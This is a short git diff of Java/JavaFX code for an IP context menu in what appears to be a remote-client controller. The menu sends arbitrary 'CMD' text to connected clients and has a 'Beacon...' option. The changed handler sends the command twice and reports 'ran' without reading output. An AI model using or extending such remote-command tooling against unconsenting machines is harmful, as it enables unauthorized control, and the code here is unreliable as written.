@@ -9,6 +9,7 @@ import Logger.Logger;
 import Server.Data.PseudoBase;
 import Server.Data.Repository;
 import Server.ServerSettings;
+import javafx.application.Platform;
 import javafx.scene.Scene;
 import javafx.scene.control.ContextMenu;
 import javafx.scene.control.Menu;
@@ -19,7 +20,9 @@ import javafx.scene.input.ClipboardContent;
 import javafx.scene.input.MouseEvent;
 import javafx.stage.Stage;
 
+import java.io.BufferedReader;
 import java.io.IOException;
+import java.io.InputStreamReader;
 
 class IPContextMenu implements Repository {
     ContextMenu getIPContextMenu(TableCell n, MouseEvent e) {
@@ -37,19 +40,17 @@ class IPContextMenu implements Repository {
             sendCommandView.getsendCommandButton().setOnAction(a -> {
                 clientObject.clientCommunicate("CMD " + sendCommandView.getTextField().getText());
 
-//                Platform.runLater(() -> {
-//                    try {
-//                        String comm;
-//                        BufferedR eader in = new BufferedReader(new InputStreamReader(clientObject.getClient().getInputStream()));
-//                        clientObject.clientCommunicate("CMD " + sendCommandView.getTextField().getText());
-//                        do {
-//                            comm = in.readLine();
-//                            sendCommandView.getConsole().appendText(comm);
-//                        } while (!comm.contains("end"));
-//                    } catch (IOException e1) {
-//                        e1.printStackTrace();
-//                    }
-//                });
+                Platform.runLater(() -> {
+                    try {
+                        String comm;
+                        BufferedReader in = new BufferedReader(new InputStreamReader(clientObject.getClient().getInputStream()));
+                        clientObject.clientCommunicate("CMD " + sendCommandView.getTextField().getText());
+                        sendCommandView.getConsole().appendText("ran");
+
+                    } catch (IOException e1) {
+                        e1.printStackTrace();
+                    }
+                });
             });
         });
         Menu sb3 = new Menu("Beacon...");
